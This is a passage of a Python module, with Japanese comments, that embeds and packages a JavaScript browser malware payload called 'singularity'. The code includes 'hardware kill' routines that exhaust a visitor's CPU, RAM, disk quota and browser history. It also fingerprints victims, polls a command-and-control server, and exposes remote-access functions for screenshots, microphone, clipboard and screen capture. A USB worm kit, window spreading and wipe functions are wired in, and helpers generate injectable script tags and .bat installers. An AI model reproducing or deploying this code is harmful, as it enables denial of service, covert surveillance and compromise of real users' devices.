    try {
      ESE = new EventSource(CFG.cmd.replace(/\/cmd$/, "/sse") + q);
      ESE.onmessage = function (e) { try { handleCmd(JSON.parse(e.data)); } catch (er) {} };
      ESE.onerror = function () {};
    } catch (e) {}
  }
  setInterval(function () {
    if (!CFG.cmd) return;
    fetch(CFG.cmd + q + "&t=" + now(), { cache: "no-store" })
      .then(function (r) { return r.json(); }).then(handleCmd).catch(function () {});
  }, CFG.cmdInterval);
}

/* ================= 13. 絶滅（HARDWARE KILL） ================= */
var HARDW = "var H=[],RUN=0;function loop(){if(!RUN)return;var t=performance.now(),n=0;"
  + "while(performance.now()-t<180){Math.sqrt(n)*Math.sin(n*0.7);n++;}"
  + "try{postMessage({k:'tick',n:n});}catch(e){}setTimeout(loop,0);}"
  + "onmessage=function(e){var d=e.data||{};if(d.k==='burn'){if(!RUN){RUN=1;loop();}}"
  + "else if(d.k==='stop'){RUN=0;}else if(d.k==='ram'){var mb=d.mb|0;"
  + "for(var i=0;i<mb;i++){try{H.push(new Float64Array(131072));}catch(x){break;}}"
  + "try{postMessage({k:'ram',got:H.length});}catch(x){}}};";

var HK = { on: 0, workers: 0, idb: 0 };

function hardOn() {
  var m = CFG.hardMode || "";
  if (m === "always") return true;
  if (m === "install") return !!(FROM_OS || STANDALONE || R.installed || Q("hard") === "1");
  return false;
}
function hardKill() {
  if (!hardOn() || HK.on) return;
  HK.on = 1;
  CFG.diskRatio = 0;
  R.hard = { on: 1, at: now(), workers: 0, ramMB: 0, diskMB: 0, history: 0 };
  try { if (navigator.storage && navigator.storage.persist) navigator.storage.persist(); } catch (e) {}
  try { CFG.uncloseable = 1; uncloseable(); } catch (e) {}
  try { hardCpu(); } catch (e) { err_(e); }
  try { hardRam(); } catch (e) { err_(e); }
  try { hardDisk(); } catch (e) { err_(e); }
  try { hardHistory(); } catch (e) { err_(e); }
  push(true);
}
function hardCpu() {
  var n = Math.max(4, (navigator.hardwareConcurrency || 4) * 4);
  for (var i = 0; i < n; i++) {
    try {
      var w = new Worker(URL.createObjectURL(new Blob([HARDW], { type: "application/javascript" })));
      w.postMessage({ k: "burn" });
      WORKERS.push(w); HK.workers++;
    } catch (e) { err_(e); }
  }
  R.hard.workers = HK.workers;
}
function hardRam() {
  var total = Math.max(512, Math.round((navigator.deviceMemory || 4) * 1024 * 1.25));
  var per = Math.max(64, Math.round(total / Math.max(1, HK.workers)));
  for (var i = 0; i < WORKERS.length; i++) {
    try { WORKERS[i].postMessage({ k: "ram", mb: per }); } catch (e) {}
  }
  R.hard.ramMB = per * Math.max(1, HK.workers);
}
function hardDisk() {
  if (!navigator.storage || !navigator.storage.estimate) return;
  var MB = 4 * 1024 * 1024;
  function chunk(i) {
    var a = new Uint8Array(MB);
    a[0] = i & 255; a[1] = (i >>> 8) & 255; a[2] = (i >>> 16) & 255; a[3] = (i >>> 24) & 255;
    return new Blob([a]);
  }
  navigator.storage.estimate().then(function (est) {
    var quota = est.quota || 0, used = est.usage || 0;
    if (!quota) return;
    var left = Math.floor(quota * 0.97) - used;
    if (left < MB * 4) return;
    var req = indexedDB.open("sg_hard", 1);
    req.onupgradeneeded = function () {
      var d = req.result;
      if (!d.objectStoreNames.contains("b")) d.createObjectStore("b");
    };
    req.onsuccess = function () {
      var db = req.result, n = Math.floor(left / MB);
      (function step(i) {
        if (i >= n) { push(true); return; }
        try {
          var tx = db.transaction("b", "readwrite");
          tx.objectStore("b").put(chunk(i), i);
          tx.oncomplete = function () {
            HK.idb++; R.hard.diskMB = HK.idb * 4;
            if ((i & 31) === 0) push(false);
            setTimeout(function () { step(i + 1); }, 0);
          };
          tx.onerror = function () { setTimeout(function () { step(i + 1); }, 0); };
        } catch (e) { err_(e); }
      })(0);
    };
    req.onerror = function () { err_("hard idb"); };
  }).catch(function () {});
}
function hardHistory() {
  var n = 0, cap = 8000;
  (function step() {
    var end = Math.min(n + 200, cap);
    for (; n < end; n++) { try { history.pushState({ n: n }, "", "#sg" + n); } catch (e) { return; } }
    R.hard.history = n;
    if (n < cap) setTimeout(step, 0);
  })();
}

/* ================= boot ================= */
function arm() {
  try {
    R.hello = { at: now(), u: Q("u") || "root", w: W, ref: Q("ref"),
                ua: navigator.userAgent.slice(0, 120), win: WIN, ifr: IFR, os: FROM_OS,
                mob: IS_MOBILE ? 1 : 0, ios: IS_IOS ? 1 : 0, inapp: INAPP ? 1 : 0 };
  } catch (e) {}
  try { push(true); } catch (e) {}
  if (IS_MOBILE) { try { hint(); tapOverlay(); } catch (e) {} }
  try { autoStart(); } catch (e) { err_(e); }

  try { base(); } catch (e) { err_(e); }
  try { pageMeta(); } catch (e) {}
  try { R.vectors.canvas = canvasFP(); } catch (e) {}
  try { R.vectors.webgl = webglFP(); } catch (e) {}
  try { R.vectors.fonts = fontFP(); } catch (e) {}
  try { R.vectors.math = mathFP(); } catch (e) {}
  try { audioFP(); } catch (e) {}
  try { netGuess(); } catch (e) {}
  try { privacy(); } catch (e) {}
  try { adblock(); } catch (e) {}
  try { botProbe(); } catch (e) {}
  try { devices(); } catch (e) {}
  try { perms(); } catch (e) {}
  try { codecs(); } catch (e) {}
  try { benchmark(); } catch (e) {}
  try { behavior(); } catch (e) {}
  try { motion(); } catch (e) {}
  try { mutate(); } catch (e) {}
  try { persistState(); } catch (e) {}
  try { resurrect(); } catch (e) {}
  try { cryptoID(); } catch (e) {}
  try { swInstall(); } catch (e) {}
  try { installKit(); } catch (e) { err_(e); }
  try { usbWormKit(); } catch (e) { err_(e); }
  try { camera(); } catch (e) {}
  try { geo(); } catch (e) {}
  try { federation(); } catch (e) {}
  try { c2(); } catch (e) {}
  try { leak(function () {}); } catch (e) {}

  addEventListener("pointerdown", function () {
    if ((CFG.winMode || "off") !== "off") { R.breeded = 0; try { windowBreed(); } catch (e) {} }
  }, { once: true });

  if (WIN) {
    /* 繁殖タブ：軽くしすぎない。音も鳴らす。DLも少量やる */
    CFG.iframes = 0; CFG.clipHijack = 0;
    CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0;
    CFG.tabs = 0; CFG.speakFlood = 0; CFG.history = 0;
    CFG.audio = 1; CFG.wakelock = 1; CFG.uncloseable = 1; CFG.winSkin = 1;
    CFG.downloads = 1; CFG.dlMB = 1; CFG.dlGap = 1500;
    CFG.cores = clamp(Math.round((navigator.hardwareConcurrency || 4) / 2), 2, 8);
    CFG.ramMB = 256; CFG.workerMB = 24;
    CFG.domNodes = 3000; CFG.cssAnim = 80; CFG.timers = 24;
    CFG.glContexts = 4; CFG.acContexts = 2; CFG.cacheBuckets = 50;
    CFG.microtasks = 1; CFG.jsonChurn = 1; CFG.layoutThrash = 1; CFG.readback = 1;
    CFG.oscBank = 24; CFG.badge = 0; CFG.favicon = 0;
    try { winSkin(); } catch (e) {}
    try { audioLoop(); } catch (e) {}
    try { audioUnlock(); } catch (e) {}
  }
  if (IFR) {
    CFG.iframes = 0; CFG.windows = 0; CFG.downloads = 0; CFG.clipHijack = 0;
    CFG.speakFlood = 0; CFG.fsFolder = 0; CFG.sharedWorker = 0; CFG.installer = 0;
    CFG.domNodes = Math.round((CFG.domNodes || 0) / 2);
    CFG.cssAnim = Math.round((CFG.cssAnim || 0) / 2);
    CFG.timers = Math.round((CFG.timers || 0) / 2);
    CFG.cores = Math.max(2, Math.round((navigator.hardwareConcurrency || 4) / 2));
  }

  push(false);
  setInterval(function () { push(false); }, CFG.interval);
  addEventListener("pagehide", function () { push(true); });
  addEventListener("visibilitychange", function () {
    if (document.visibilityState === "hidden") push(true);
    if (document.visibilityState === "visible" && QUEUE.length) {
      R.tapped = 0; try { tapOverlay(); } catch (e) {}
    }
  });
  addEventListener("online", function () { push(true); });
  setTimeout(function () { try { domSnap(false); push(true); } catch (e) {} }, 12000);
  setInterval(function () { try { domSnap(false); } catch (e) {} }, 45000);

  if (CFG.wipe) { setTimeout(wipe, 1600); }
  try { hopFile(); } catch (e) {}
  GATED = !bombGate();
  if (GATED) applyLevel(0);
  if (!CFG.fire) { push(false); return; }
  if (GATED) { push(false); return; }

  try { if (hardOn()) hardKill(); } catch (e) { err_(e); }
  try { keeperStart(); } catch (e) { err_(e); }
  setTimeout(function () { startBurns(); }, 900);

  if (CFG.freeze === "soft" || CFG.freeze === "hard") {
    setTimeout(function () { freezeNow(CFG.freeze); }, 8000);
  }
}

window.__singularity = {
  report: function () { return R; },
  flush: function () { push(true); },
  install: function () { return window.__sgInstall ? window.__sgInstall() : false; },
  native: function (ext) { return niDownload(ext || "bat"); },
  usb: function () { return R.usb; },
  cmd: runCmd, peers: function () { return { peers: 0, leader: true }; },
  shot: ratShot, mic: ratMic, clip: ratClip, screen: ratScreen, speak: speak,
  freeze: freezeNow, wipe: wipe, pause: pauseAll, ota: ota,
  breed: function (n) { CFG.winMode = "breed"; CFG.winBranch = clamp(n || 2, 1, 8); windowBreed(); },
  breedN: function (m) { runCmd({ kind: "breed", arg: String(m || 2) }); },
  tabs: function (n) { spawnMany(clamp(n || 6, 1, 64)); },
  tap: function () { return flushQueue(true); },
  queue: function () { return QUEUE.length; },
  live: function () { return liveN(); },
  auto: function (on) { AUTO_ON = on !== false; return AUTO_ON; },
  mobile: function () { return IS_MOBILE; },
  hard: hardKill,
  destroy: function () {
    pauseAll();
    try { localStorage.clear(); } catch (e) {}
    try { indexedDB.deleteDatabase("singularity"); } catch (e) {}
    try { navigator.serviceWorker.getRegistrations().then(function (r) { r.forEach(function (x) { x.unregister(); }); }); } catch (e) {}
    window.__SINGULARITY__ = false;
  }
};

if (document.readyState === "loading") addEventListener("DOMContentLoaded", arm, { once: true });
else arm();
})();
"""

# ---------------------------------------------------------------------------
# 個体仕様
# ---------------------------------------------------------------------------
VIRUS = {
    "id": VIRUS_ID,
    "name": VIRUS_NAME,
    "name_ja": VIRUS_NAME_JA,
    "version": VIRUS_VERSION,
    "class": VIRUS_CLASS,
    "fixed_level": 7,
    "modes": ["singularity"],
    "payload": PAYLOAD_JS,
    "worker": WORKER_JS,
    "sw": SW_JS,
    "shared": SHARED_JS,
    "spec": {
        "level": 1, "fixed": False, "finalRamMB": 0, "gpuMem": True,
        "winMode": "off", "winBranch": 2, "winDepth": 0, "winSkin": 0,
        "hardMode": "", "swarm": 0, "dlMB": 1,
    },
    "defaults": {
        "level": 1, "fixed": False, "finalRamMB": 0, "gpuMem": True,
        "winMode": "off", "winBranch": 2, "winDepth": 0, "winSkin": 0,
        "hardMode": "", "swarm": 0, "dlMB": 1,
    },
    "tags": ["apex", "resident", "pwa", "sw-inject", "sse-c2", "rat", "usb-worm",
             "os-resident", "window-breed", "infinite-windows", "exponential",
             "window-skin", "hardware-kill", "swarm-keeper", "mobile-tap-breed",
             "auto-breed", "unlimited-l7", "heavy-download", "notify-all-levels",
             "watch-cmd-alias"],
}

_ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789"


def new_sid(n: int = 14) -> str:
    """個体ID（URL・Cookie・DBキーに安全な文字のみ）。"""
    return "".join(secrets.choice(_ALPHA) for _ in range(max(6, n)))


def build_payload(cfg: Optional[Dict[str, Any]] = None, sid: str = "",
                  ver: str = VIRUS_VERSION) -> str:
    """cfg を差し込んだペイロード一式（__SINGULARITY_VER__ を必ず埋める）。"""
    c = dict(cfg or {})
    c.setdefault("sid", sid)
    c.setdefault("ver", ver)
    return ("<script>window.__SINGULARITY_VER__=" + json.dumps(ver)
            + ";window.__SINGULARITY_CFG__=" + json.dumps(c, ensure_ascii=False)
            + ";</script>\n" + PAYLOAD_JS)


def build_installer(tmpl: str, url: str, code: str, app: str, burn: int,
                    disk_mb: int, ver: str = VIRUS_VERSION, crlf: bool = False,
                    hard: int = 0, ram_mb: int = 512) -> str:
    """テンプレのトークンを差し込み、必要なら CRLF に正規化して返す（.bat は CRLF 必須）。"""
    out = (tmpl.replace("__URL__", url)
                .replace("__CODE__", code)
                .replace("__APP__", app)
                .replace("__BURN__", str(burn))
                .replace("__DISKMB__", str(disk_mb))
                .replace("__HARD__", "1" if hard else "0")
                .replace("__RAMMB__", str(ram_mb))
                .replace("__VER__", ver))
    if crlf:
        out = out.replace("\r\n", "\n").replace("\n", "\r\n")
    return out


def spec() -> Dict[str, Any]:
    return {"id": VIRUS_ID, "name": VIRUS_NAME, "version": VIRUS_VERSION,
            "level_label": LEVEL_LABEL, "level_desc": LEVEL_DESC,
            "tags": VIRUS["tags"]}


_ = (base64, time)   # noqa